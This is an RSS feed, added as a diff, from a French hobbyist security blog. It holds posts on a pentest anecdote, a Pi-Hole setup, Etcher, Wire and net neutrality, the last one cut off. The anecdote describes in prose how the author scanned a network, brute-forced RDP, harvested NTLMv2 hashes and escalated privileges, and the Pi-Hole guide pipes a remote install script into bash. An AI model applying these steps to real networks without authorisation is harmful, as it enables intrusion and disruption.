@@ -1,0 +1,550 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Fun &#8211; ~# Hackonch !</title>
+	<atom:link href="https://hackonch.ml/fr/category/fun/feed/" rel="self" type="application/rss+xml" />
+	<link>https://tchernobyl.altervista.org</link>
+	<description>Sécurité rime avec Liberté</description>
+	<lastBuildDate>Mon, 19 Aug 2019 17:43:40 +0000</lastBuildDate>
+	<language>fr-FR</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+
+<image>
+	<url>https://hackonch.ml/fr/wp-content/uploads/2019/08/favicon-1-90x90.png</url>
+	<title>Fun &#8211; ~# Hackonch !</title>
+	<link>https://tchernobyl.altervista.org</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Comment perdre son Système d&#8217;Information à cause d&#8217;un serveur d&#8217;impression</title>
+		<link>https://hackonch.ml/fr/fun/comment-perdre-son-systeme-dinformation-a-cause-dun-serveur-dimpression/</link>
+				<pubDate>Wed, 07 Aug 2019 08:11:59 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+
+		<guid isPermaLink="false">https://hackonch.ml/fr/?p=1417</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Il y a peu de temps, un de mes amis passionné par le pentesting a vécu une sacré aventure. Comme il est américain j&#8217;ai fait un&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/fun/comment-perdre-son-systeme-dinformation-a-cause-dun-serveur-dimpression/" class="btn btn-primary btn-effect btn-lg"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/comment-perdre-son-systeme-dinformation-a-cause-dun-serveur-dimpression/">Comment perdre son Système d&rsquo;Information à cause d&rsquo;un serveur d&rsquo;impression</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde, </p>
+<p>Il y a peu de temps, un de mes amis passionné par le pentesting a vécu une sacré aventure. Comme il est américain j&rsquo;ai fait un petit travail d&rsquo;adaptation afin que vous compreniez au mieux l&rsquo;histoire. Je tiens à préciser qu&rsquo;elle est bien entendue 100% véridique et qu&rsquo;elle s&rsquo;est passé dans une moyenne entreprise de services informatique basée aux USA. C&rsquo;est parti !</p>
+<h3>Introduction </h3>
+<p>La semaine dernière, on m&rsquo;a donné accès à un réseau qui semblait au premier abord sécurisé.</p>
+<p>Comme je suis un peu curieux, la première chose que j&rsquo;ai fait en m&rsquo;installant a été de lancer un scan réseau pour voir combien d’hôtes étaient actifs et ainsi pour avoir une vague idée du SI (Système d&rsquo;Information) de l&rsquo;entreprise. Tout ce que j&rsquo;avais à ce stade comme information, c&rsquo;était mon adresse IP qui me renseignait la plage d&rsquo;adressage de l&rsquo;étage. Il s&rsquo;agissait d&rsquo;un bon /24 comme on les aime soit un maximum de 254 hôtes pour l&rsquo;étage. </p>
+<p>Je laisse donc nmap faire son petit boulot avec les informations que j&rsquo;ai et lorsqu&rsquo;il a terminé, presque tous les appareils étaient directement visibles. Je relance nmap une seconde fois sur un hôte au hasard pour voir si quelque chose change. Je compare donc le résultat avec celui du scan précédent. Et là, une petite lumière s&rsquo;allume dans ma tête, car je constate que le port 445 est ouvert sur presque toutes les machines. Je me presse alors d&rsquo;essayer un petit EternalBlue contre quelques hôtes, mais la connexion tombe à chaque fois. Je me dis alors que c&rsquo;est probablement un pare-feu qui doit bloquer la connexion. En essayant de comprendre ce qui s&rsquo;est passé, je remarque que j&rsquo;ai tenté d&rsquo;attaquer un appareil nommé « PRINT-PC ».</p>
+<p>Je relance un scan nmap et je constaste qu&rsquo;en plus du port Samba (445), le port RDP (3389) est également ouvert. Naturellement je me mets en tête de brute forcer le mot de passe RDP (Remote Desktop Protocol) en prenant le soin d&rsquo;utiliser un nom d&rsquo;utilisateur que j&rsquo;ai recueilli à partir de la précédente attaque sur le port 445. Après une bonne minute, le logiciel se coince et répète 1234 en donnant une erreur à chaque tentative. J&rsquo;ouvre alors mon client RDP pour voir ce qui cloche et&#8230;</p>
+<p><center><img src="https://i.stack.imgur.com/o6GOJ.png" alt="OMG" /><figcaption>Le mot de passe était vraiment 1234 ! 😱 </figcaption></center></p>
+<p>Je me balade un peu sur le compte que je viens de pirater et, en fouillant un peu, je trouve des informations pour le moins sensibles. Environ 2 Go de données en tout. Après coup, je n&rsquo;ai pas manqué de signaler le problème à l&rsquo;équipe technique.</p>
+<p>C&rsquo;est à ce moment précis que je me dis que comme le bâtiment comporte plusieurs étages, le réseau doit être conçu de la même façon. J&rsquo;essaie donc de me connecter via RDP sur la même adresse en ne changeant que le numéro d&rsquo;étage à chaque fois. Et là, suprise total, ça a marché !!</p>
+<p>Après cela, je lance un script pour récupérer les hashes NTMLv2 pour tenter une escalade des privilèges (la suite logique). Par chance je reçois presque tous les hashes de tous les utilisateurs du domaine. Le truc un peu moins glorieux en revanche, c&rsquo;est que j&rsquo;ai fait un peu de bruit dans le réseau: le script a diffusé mon IP sur le PBX utilisé par le personnel directement depuis leurs machines et non pas depuis un téléphone Cisco externe et c&rsquo;est comme ça qu&rsquo;au bout de 5 minutes montre en main, j’ai entendu tout le monde se plaindre que « plus rien ne marchait », même pas les téléphones !</p>
+<p><center><img src="https://media.giphy.com/media/An4MkAbxeiyqY/giphy.gif" alt="OMG" /></center></p>
+<p>Malgré toute la panique ambiante, j’ai quand même réussi à faire ma petite escalade des privilèges et à ouvrir sur un poste quelconque un terminal avec les droits administrateurs! Et même s&rsquo;il est vrai que juste après, j&rsquo;ai passé un sale quart d&rsquo;heure en l&rsquo;aimable compagnie de l&rsquo;équipe du service informatique, cette petite anecdote a bien fait ma semaine !</p>
+<h3>Conclusion</h3>
+<p>En bref, tout ça pour dire qu&rsquo;il ne suffit malheureusement que d&rsquo;un serveur d&rsquo;impression Windows mal protégé pour faire tomber toute la sécurité du SI. Rajoutez à cela un peu de chance (ou de malchance) et vous aurez droit en prime à un chaos sans nom pouvant transformer n&rsquo;importe quelle journée d&rsquo;un employé lambda en véritable remake de World War Z ou de n&rsquo;importe quel autre film d&rsquo;apocalypse !!</p>
+<p>Voili, voilou, j’espère que cette petite histoire vous a plu. N&rsquo;hésitez pas à la partager à vos amis ou à vos collègues! Je vous dis à très bientôt pour un nouvel article et pourquoi pas une nouvelle histoire 🤠</p>
+<p>D’ici là, portez-vous bien, soyez aimables avec les lamas et à bientôt tout le monde !</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/comment-perdre-son-systeme-dinformation-a-cause-dun-serveur-dimpression/">Comment perdre son Système d&rsquo;Information à cause d&rsquo;un serveur d&rsquo;impression</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Pi-Hole ou comment mettre Adblock sur tout un réseau</title>
+		<link>https://hackonch.ml/fr/diy/pi-hole-ou-comment-mettre-adblock-sur-tout-un-reseau/</link>
+				<pubDate>Sun, 14 Jul 2019 19:34:30 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[DIY]]></category>
+		<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Vie Privée]]></category>
+		<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1202</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Est-ce que vous utilisez Adblock, Ublock ou tout autre extension pour bloquer les pubs ? En ce qui me concerne, oui. C&#8217;est très simple, je ne&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/diy/pi-hole-ou-comment-mettre-adblock-sur-tout-un-reseau/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/diy/pi-hole-ou-comment-mettre-adblock-sur-tout-un-reseau/">Pi-Hole ou comment mettre Adblock sur tout un réseau</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde, </p>
+<p>Est-ce que vous utilisez Adblock, Ublock ou tout autre extension pour bloquer les pubs ? En ce qui me concerne, oui. C&rsquo;est très simple, je ne peux tout simplement pas utiliser un navigateur si je n&rsquo;ai pas de bloqueur de pub d&rsquo;installé !</p>
+<p><img src="https://i.imgur.com/ynmzKmA.jpg" style="width: 50%;height: 50%" /><figcaption>Un meme qui explique bien ma situation 🙂</figcaption>Le souci avec ce genre d&rsquo;extensions, c&rsquo;est qu&rsquo;elles consomment beaucoup de ressources processeur / mémoire en plus de devoir être installées sur le navigateur en question pour fonctionner. Alors oui, je sais, il existe des navigateurs avec des bloqueurs de pub intégrés mais parfois, on a juste ni le choix du navigateur, ni la possibilité d&rsquo;installer une extension. </p>
+<p>Parfois, on aimerait juste que ça fonctionne, comme ça, naturellement, sans n&rsquo;avoir rien à faire et ça, sur tous les appareils de la maison ou du bureau (« out-of-the-box » comme diront les plus anglophones 🙂 ).</p>
+<p>Si vous pensez comme moi, alors vous êtes à la bonne adresse, car aujourd&rsquo;hui, je vous propose ce petit tuto <a href="https://blog.tchernobyl.ml/category/diy/">DIY</a> afin d&rsquo;en finir définitivement avec les pubs chez vous ou à votre lieu de travail.</p>
+<h3>Ingrédients : </h3>
+<p>&#8211; un Raspberry Pi 🍓 (désolé il n&rsquo;y avait plus d&#8217;emojis framboise)<br />
+&#8211; une carte SD, à la base je n&rsquo;en ai pas vraiment besoin vu l&rsquo;installation que j&rsquo;ai (<a href="https://blog.tchernobyl.ml/diy/tchernobyl-ml-un-raspberry-pi-et-ca-repart/" rel="noopener noreferrer" target="_blank">ici</a>)mais une carte SD de 4 Go devrait être largement suffisante.<br />
+&#8211; une alimentation usb (si vous n&rsquo;avez pas l&rsquo;alimentation officielle sous la main, votre chargeur *<strong>USB</strong>* de téléphone fait largement l&rsquo;affaire)<br />
+&#8211; une distribution Linux, la plus plébiscité sur Raspberry Pi étant Raspbian, on prendra Rapsbian, mais n&rsquo;importe quel distrib fait l&rsquo;affaire !<br />
+&#8211; un autre ordinateur (pour configcaptionr notre framboise)</p>
+<h3>Préparer le terrain : </h3>
+<p>Normalement, quand vous sortez du carton votre Raspberry Pi, il n&rsquo;y a rien d&rsquo;installé, courrez donc brancher votre carte SD dans le lecteur de carte SD de votre autre ordinateur afin d&rsquo;installer Raspbian sur la carte comme précisé sur ce petit <a href="https://blog.tchernobyl.ml/diy/etcher-ou-rendre-une-usb-bootable-sur-linux-mac-os-ou-meme-windows/">tuto</a></p>
+<p>Après cela, on s&#8217;empresse d&rsquo;activer le service SSH de notre Raspberry Pi en allant dans la partition boot (et non le dossier /boot à la racine). Une fois qu&rsquo;on est dans la bonne partition, on crée simplement un fichier vide nommé « ssh ».</p>
+<p>Et voilà, c&rsquo;est bon pour l&rsquo;installation du Raspberry, il ne reste plus qu&rsquo;à insérer la carte SD dans le port prévu à cet effet, d&rsquo;allumer le tout et d&rsquo;utiliser son terminal en se connectant via SSH au Raspberry Pi :</p>
+<pre>
+ssh pi@[ADRESSE_LOCALE_RASPBERRY]
+</pre>
+<p>puis en mot en de passe : « raspberry »</p>
+<p>ou via Putty pour les plus Windowsiens</p>
+<p><img src="https://i.imgur.com/YJJ5KN3.png" /><figcaption>on met l&rsquo;IP du Raspberry dans le champ IP</figcaption><img src="https://i.imgur.com/e4pV7nU.png" /><figcaption>puis on met le mot de 🙂 </figcaption>Une fois qu&rsquo;on a le contrôle du RPI, on change au moins le mot de passe de l&rsquo;utilisateur par défaut (en attendant l&rsquo;article qui va bien) à l&rsquo;aide de la commande :</p>
+<pre>
+pi@raspberry:~ $ passwd
+Mot de passe actuel : "raspberry"
+Nouveau mot de passe : [N'IMPORTE_QUOI_MAIS_PAS_"raspberry" !!]
+Confirmation du mot de passe : [le même mot de passe que précédement entré :) ]
+</pre>
+<p>À présent il est temps de parler de la solution que j&rsquo;ai choisi : « Pi-Hole ». Il s&rsquo;agit d&rsquo;une solution Open-Source, ultra simpliste comme toujours et qui permet de régler notre souci de publicité d&rsquo;une manière aussi intuitive qu&rsquo;efficace. En effet, une fois que l&rsquo;on aura mis en place la solution, le Raspberry jouera le rôle de « filtre ». </p>
+<p>L&rsquo;installation de Pi-Hole est ultra simpliste : </p>
+<pre>
+pi@raspberry:~ $ curl -sSL https://install.pi-hole.net | bash
+</pre>
+<p>le script devrait se lancer :</p>
+<p><img src="https://i.imgur.com/rHChPdC.png" /><figcaption>cette framboise&#8230; 😍</figcaption>On déroule le script d&rsquo;installation en naviguant avec les touches directionnelles du clavier jusqu&rsquo;à cette étape qui est selon moi la plus importante. Ceux qui auront lu mon article sur les <a href="https://blog.tchernobyl.ml/diy/les-dns-ou-comment-reprendre-le-controle-sur-sa-vie-privee-une-etape-a-la-fois/" rel="noopener noreferrer" target="_blank">DNS</a> (<a href="https://blog.tchernobyl.ml/diy/les-dns-ou-comment-reprendre-le-controle-sur-sa-vie-privee-une-etape-a-la-fois/" rel="noopener noreferrer" target="_blank">ici</a>) sauront quoi choisir en DNS 🙂<br />
+<img src="https://i.imgur.com/wnfcdov.png" /></p>
+<p>Une fois l&rsquo;installation terminée, l&rsquo;adresse d&rsquo;une page d&rsquo;administration ainsi que votre mot de passe pour y accéder vous sont donnés, retenez le mot de passe ! Si vous préférez un autre mot de passe, vous pouvez toujours le changez via la commande : </p>
+<pre>
+pi@raspberry:~ $ sudo pihole -a -p
+</pre>
+<p>Une fois que tout est bien configuré on vérifie juste que la page d&rsquo;administration fonctionne, si tout se passe bien vous devriez avoir affaire à une page semblable à celle-ci : </p>
+<p><img src="https://i.imgur.com/s6aW8Yq.png" /></p>
+<p>À partir de là, vous pourrez configcaptionr Pi-Hole à votre guise afin d&rsquo;y mettre des réglages plus fin si vous le souhaitez. L&rsquo;avantage avec cet outil, c&rsquo;est qu&rsquo;on peut maintenant tout superviser et potentiellement tout bloquer, faites donc attention à ne pas faire vivre à votre entourage une mini NSA domestique ou un Big Brother en puissance ! ☹️</p>
+<p><img src="https://i.imgur.com/ugsFtdq.jpg" /><figcaption>Voilà typiquement l&rsquo;exemple à ne pas suivre 😥 </figcaption>À partir de maintenant, vous faites comme vous le sentez ! En effet, vous avez trois choix de déploiement :</p>
+<p>&#8211; La manière douce, en changeant l&rsquo;adresse IP du serveur DNS de votre Box internet par celle de votre Raspberry et ainsi en mettant la configuration DNS de tous les autres appareils par défaut (comme ça, les appareils récupèrent automatique l&rsquo;adresse DNS du Raspberry).</p>
+<p>&#8211; La manière fine (ou « cas par cas »), en changeant l&rsquo;adresse IP du serveur DNS de chaque machine que vous souhaitez « libérer » des pubs.</p>
+<p>&#8211; La manière radicale, désactiver DHCP de votre Box internet et laisser le Raspberry tout faire tout seul via le serveur DHCP intégré. </p>
+<p>Les trois méthodes fonctionnent bien entendu tout aussi bien, vous faîtes vraiment comme vous le sentez. Personnellement j&rsquo;ai une préférence pour la manière douce, car c&rsquo;est celle qui est selon moi la moins casse-tête. Par exemple, si vous achetez un nouvel appareil, aucune configuration n&rsquo;est requise pour cet appareil, car il récupère automatiquement l&rsquo;adresse du Raspberry via votre Box internet.</p>
+<h3>Verdict </h3>
+<p>Pour avoir testé Pi-Hole, je dois reconnaître qu&rsquo;il s&rsquo;agit là d&rsquo;une solution comme je les aime, à savoir hyper simple à installer, hyper simple à configcaptionr, hyper simple à déployer et qui sont très souvent les plus efficaces qui puissent exister. Le tout servi, s&rsquo;il vous plait, avec une documentation bien fournie qui permette bien entendu d&rsquo;aller plus loin. </p>
+<p>Voili, voilou, on ne change pas les bonnes habitudes, j&rsquo;espère que cet article vous a plus, n&rsquo;hésitez pas à le partager avec vos collègues ou vos amis et évidemment à faire votre propre idée sur le sujet.</p>
+<p>D&rsquo;ici là, portez-vous bien, buvez de l&rsquo;eau car l&rsquo;eau c&rsquo;est la vie et à bientôt tout le monde !</p>
+<p><img src="https://i.imgur.com/bYJGrl5.jpg" /></p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/diy/pi-hole-ou-comment-mettre-adblock-sur-tout-un-reseau/">Pi-Hole ou comment mettre Adblock sur tout un réseau</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Etcher ou rendre une usb bootable sur Linux, Mac OS ou même Windows</title>
+		<link>https://hackonch.ml/fr/diy/etcher-ou-rendre-une-usb-bootable-sur-linux-mac-os-ou-meme-windows/</link>
+				<pubDate>Fri, 12 Jul 2019 14:18:17 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[DIY]]></category>
+		<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Système]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1189</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Connaissez-vous « dd » ? Non ? Il s&#8217;agit d&#8217;un petit binaire GNU, sûrement un des plus incontournables qui existe. Il permet de faire tout un tas de&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/diy/etcher-ou-rendre-une-usb-bootable-sur-linux-mac-os-ou-meme-windows/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/diy/etcher-ou-rendre-une-usb-bootable-sur-linux-mac-os-ou-meme-windows/">Etcher ou rendre une usb bootable sur Linux, Mac OS ou même Windows</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde,</p>
+<p>Connaissez-vous « dd » ? Non ? Il s&rsquo;agit d&rsquo;un petit binaire GNU, sûrement un des plus incontournables qui existe. Il permet de faire tout un tas de choses dont rendre des périphériques USB / cartes SD « bootables ».</p>
+<p>Pour ceux qui seraient déjà un peu perdus, sachez que lorsque vous chercher à « graver » un système d&rsquo;exploitation en vue de l&rsquo;installer (ex: « mettre » linux sur une clef USB), on dit que vous rendez votre périphérique (clée USB, carte SD, disque dur externe&#8230;) « bootable » ou amorçable en français. Pour les puristes, je suis au courant que ce n&rsquo;est pas exactement ça mais hey! Gardez à l&rsquo;esprit que vous lisiez un « rappel » 🙂</p>
+<p><img src="https://i.imgur.com/ajIAehf.jpg"></p>
+<figure>« dd » ça ne sonnerait pas un peu comme le diminutif de Daenerys ?</figure>
+<p>Le hic avec cette véritable merveille sur patte (dd, pas Daenerys hein), c&rsquo;est que comme de nombreuses merveilles du genre, il faut mettre les mains dans le cambouis pour l&rsquo;utiliser car il s&rsquo;agit la plupart du temps de binaires à manipuler à la ligne de commande. C&rsquo;est d&rsquo;ailleurs pourquoi il n&rsquo;y a essentiellement que des gens qui ont déjà pu manipuler Linux qui connaissent « dd ».</p>
+<p><img src="https://i.imgur.com/oAdiJVV.jpg"></p>
+<figure>Ce monsieur a l&rsquo;air de connaître « dd »</figure>
+<p>En attendant que vous vous fassiez les griffes sur un Linux, voici une solution que j&rsquo;utilise depuis assez longtemps déjà, du nom de « Etcher » (ou nouvellement « Balena Etcher »).</p>
+<p>L&rsquo;avantage avec « Etcher », c&rsquo;est qu&rsquo;il s&rsquo;agit là d&rsquo;une de ces applications multiplateforme ultra simplistes comme je les aime. En effet on peut aussi bien l&rsquo;exécuter sur Linux, Mac OS ou même Windows. Il faut le reconnaître, c&rsquo;est quand même assez pratique.</p>
+<p>L&rsquo;interface est hyper simpliste :</p>
+<p><img src="https://i.imgur.com/Vw5Ymue.png"></p>
+<p>Il y a littéralement trois boutons, je ne pense pas qu&rsquo;on puisse faire plus simple et plus « user friendly » (approuvé par la mère michu pour les moins anglophones 🙂 ).</p>
+<p>Ainsi, pour rendre bootable n&rsquo;importe quel disque de stockage, il faut :</p>
+<p>1°) Sélectionner l&rsquo;image .iso / .img du système d&rsquo;exploitation que vous souhaitez mettre sur le disque amovible (cléf USB, disque dur externe, carte SD, &#8230;)<br />
+2°) Sélectionner le disque amovible<br />
+3°) « Flasher » ou appuyer sur le dernier bouton pour rendre « amorçable » le disque de stockage amovible en bon français 🙂</p>
+<p><img src="https://i.imgur.com/iZrydEH.jpg"></p>
+<figure>Je n&rsquo;aurais pas dit mieux 🙂</figure>
+<h3>Verdict</h3>
+<p>Etcher ne remplace pas « dd » mais permet au moins de rendre TOUS (et je dis bien tous) les périphériques que vous attacherez à votre ordinateur entièrement « bootables ».</p>
+<p>Ce qui est, il faut l&rsquo;admettre, assez utile lorsque vous cassez votre Linux à cause d&rsquo;un pari entre copains et que vous êtes en totale galère parce que le seul ordinateur de dispo pour flasher votre petite clef Linux est un Mac OS ou un Windaube tout pourri (ça sent le vécu 🙂 )</p>
+<p>En plus, je trouve que cet outil met un peu d&rsquo;ordre dans tout le bazar de « Unetbootin, « Rufus », « Linux live iso » et dérivés en tous genres que je trouve bien trop compliqués à utiliser pour pas grand-chose.</p>
+<p>Voili, voilou, on ne change pas les bonnes habitudes, j&rsquo;espère que cet article vous a plus, n&rsquo;hésitez pas à le partager avec vos collègues ou vos amis et évidemment à faire votre propre idée sur le sujet.</p>
+<p>D&rsquo;ici là, portez-vous bien, soyeux heureux et à bientôt tout le monde !</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/diy/etcher-ou-rendre-une-usb-bootable-sur-linux-mac-os-ou-meme-windows/">Etcher ou rendre une usb bootable sur Linux, Mac OS ou même Windows</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Wire comme bonne alternative à Skype</title>
+		<link>https://hackonch.ml/fr/systeme/wire-comme-bonne-alternative-a-skype/</link>
+				<pubDate>Mon, 08 Jul 2019 21:35:34 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Vie Privée]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1180</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Si comme moi, vous habitez dans une grotte, sachez que Microsoft va arrêter le développement de Skype ! Quand Microsoft l&#8217;a annoncé en douce 🙂 Je&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/systeme/wire-comme-bonne-alternative-a-skype/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/systeme/wire-comme-bonne-alternative-a-skype/">Wire comme bonne alternative à Skype</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde,</p>
+<p>Si comme moi, vous habitez dans une grotte, sachez que Microsoft va arrêter le développement de Skype !</p>
+<p><img src="https://media.giphy.com/media/joV1k1sNOT5xC/giphy.gif" alt="skype"><figcaption>Quand Microsoft l&rsquo;a annoncé en douce 🙂 </figcaption>Je suis conscient que certains ne vont même pas voir l&rsquo;utilité pour moi d&rsquo;en faire un article mais pour les autres (et j&rsquo;en connais un sacré paquet !) qui ne peuvent pas imaginer le mot « Visioconférence » rimer avec autre chose que Skype, j&rsquo;ai quelque chose qui pourrait vous intéresser :</p>
+<h3>Wire</h3>
+<h3>1°) Qu&rsquo;est-ce que c&rsquo;est ?</h3>
+<p>Wire est avant tout une entreprise, il ne s&rsquo;agit donc pas de pauvres gus qui codent dans leur coin une alternative à skype. Wire est donc aussi un logiciel totalement Open Source et multiplateforme, ce qui veut dire que vous pouvez très bien installer l&rsquo;appli sur Linux, Mac OS, Android, IOS ou même Windows. Mais avant de l&rsquo;installer, il y a plusieurs « plan » (ou tarifs) un peu comme slack pour ceux qui connaissent. Vous pouvez donc créer deux sortes de compte sur le site « business » (payant) ou « personal » (gratuit), un mail et un mot de passe suffisent largement pour créer un compte personal.</p>
+<p><img src="https://media.giphy.com/media/3o7TKrugYn6cXQAMTK/giphy.gif" alt="applaudissement"><figcaption>Il faut l&rsquo;admettre, c&rsquo;est une belle prouesse 🙂</figcaption><h3>2°) Fonctionnalités</h3>
+<p>Une fois que votre compte est créé et que l&rsquo;appli est installée, il n&rsquo;y a plus grand-chose à faire :</p>
+<p><img src="https://gigaom2.files.wordpress.com/2014/12/wire-screenshot-2.jpeg" alt="macos"><figcaption>Wire sur Mac OS 🙂</figcaption>Vous pouvez maintenant tout comme sur skype, créer des groupes de conversation, ajouter des personnes en ami, partager votre écran ou votre caméra, partager des images, &#8230; Le tout sans avoir ce sentiment d&rsquo;être constamment sur écoute par la NSA ou n&rsquo;importe quel autre tue-la-vie-privée. En effet, toutes les communications sont chiffrées de bout en bout ! Ce qui veut dire qu&rsquo;à part la personne avec qui vous discutez, personne ne saura que votre chien s&rsquo;appelle Médor, et même pas Wire !</p>
+<p>Et comme si ça ne suffisait pas, Wire n&#8217;embarque AUCUNE pub (oui, oui c&rsquo;est possible).</p>
+<p><img src="https://media.giphy.com/media/5VKbvrjxpVJCM/giphy.gif" alt="macos"><figcaption>La tête épique que j&rsquo;ai faite quand j&rsquo;ai vu qu&rsquo;il n&rsquo;y avait pas l&rsquo;ombre d&rsquo;une pub 🙂</figcaption><h3>3°) Verdict</h3>
+<p>Vous l&rsquo;avez peut-être compris, je suis totalement sous le charme de ce petit logiciel. J&rsquo;ai honnêtement essayé une foulée d&rsquo;alternatives à Skype ou même à Discord (oui, oui c&rsquo;est possible), mais à chaque fois il y avait quelque chose qui n&rsquo;allait pas. Sauf pour Wire, où tout fonctionne super, la qualité de l&rsquo;audio, le design, tout est au top !</p>
+<p>Voili, voilou, on ne change pas les bonnes habitudes, j&rsquo;espère que cet article vous a plu, n&rsquo;hésitez pas à le partager avec vos collègues ou vos amis et évidemment à faire votre propre idée sur le sujet.</p>
+<p>D&rsquo;ici là, portez-vous bien, buvez de l&rsquo;eau car l&rsquo;eau c&rsquo;est la vie et à bientôt tout le monde !</p>
+<h3>Quelques liens</h3>
+<p>site officiel: <a href="https://wire.com/en/" rel="noopener noreferrer" target="_blank">https://wire.com/en/</a><br />
+téléchargement: <a href="https://wire.com/en/download/" rel="noopener noreferrer" target="_blank">https://wire.com/en/download/</a></p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/systeme/wire-comme-bonne-alternative-a-skype/">Wire comme bonne alternative à Skype</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Neutralité du Net &#8211; Comment savoir si votre FAI est neutre ?</title>
+		<link>https://hackonch.ml/fr/systeme/neutralite-du-net-comment-savoir-si-votre-fai-est-neutre/</link>
+				<pubDate>Sun, 07 Jul 2019 22:37:21 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Vie Privée]]></category>
+		<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1171</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Savez-vous ce qu&#8217;est la neutralité du net ? Si ça ne vous dit rien de spéciale, voici un petit mémo de la part de Wikipédia: La&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/systeme/neutralite-du-net-comment-savoir-si-votre-fai-est-neutre/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/systeme/neutralite-du-net-comment-savoir-si-votre-fai-est-neutre/">Neutralité du Net &#8211; Comment savoir si votre FAI est neutre ?</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde,</p>
+<p>Savez-vous ce qu&rsquo;est la neutralité du net ? Si ça ne vous dit rien de spéciale, voici un petit mémo de la part de Wikipédia:</p>
+<blockquote><p>
+La neutralité du Net ou la neutralité du réseau est un principe devant garantir l&rsquo;égalité de traitement de tous les flux de données sur Internet. Ce principe exclut par exemple toute discrimination positive ou négative à l&rsquo;égard de la source, de la destination ou du contenu de l&rsquo;information transmise sur le réseau.</p></blockquote>
+<p>Je me rappelle d&rsquo;ailleurs qu&rsquo;il y a quelques années ça avait vraiment fait le buzz lorsque les États-Unis avaient décidé d&rsquo;y mettre un terme, tout pleins de célébrités de tous les horizons avaient montré leur mécontentement face à cette mesure qui n&rsquo;avantageais QUE les gros opérateurs bien juteux comme AT&amp;T et j&rsquo;en passe&#8230;</p>
